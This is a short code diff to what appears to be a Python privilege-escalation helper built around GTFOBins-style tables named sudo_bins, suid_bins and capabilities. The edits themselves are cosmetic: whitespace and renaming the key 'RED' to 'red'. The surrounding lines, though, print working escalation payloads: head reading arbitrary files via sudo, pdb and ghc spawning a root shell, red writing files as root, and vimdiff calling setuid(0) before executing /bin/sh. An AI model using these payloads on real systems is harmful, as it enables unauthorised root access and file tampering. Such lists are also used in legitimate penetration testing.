@@ -19,7 +19,7 @@ import time
 import select
 
 # SUDO_BINS_START
-sudo_bins = {
+sudo_bins={
     "head": [
         "LFILE=file_to_read\nsudo head -c1G \"$LFILE\"\n"
     ],
@@ -950,8 +950,8 @@ sudo_bins = {
     "pdb": [
         "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"
     ],
-    "RED": [
-        "sudo RED file_to_write\na\nDATA\n.\nw\nq\n"
+    "red": [
+        "sudo red file_to_write\na\nDATA\n.\nw\nq\n"
     ],
     "ghc": [
         "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
@@ -1167,7 +1167,7 @@ sudo_bins = {
 # SUDO_BINS_END
 
 # SUID_BINS_START
-suid_bins = {
+suid_bins={
     "head": [
         "LFILE=file_to_read\n./head -c1G \"$LFILE\"\n"
     ],
@@ -1808,7 +1808,7 @@ suid_bins = {
 # SUID_BINS_END
 
 # CAPABILITIES_START
-capabilities = {
+capabilities={
     "vimdiff": [
         "./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
     ],
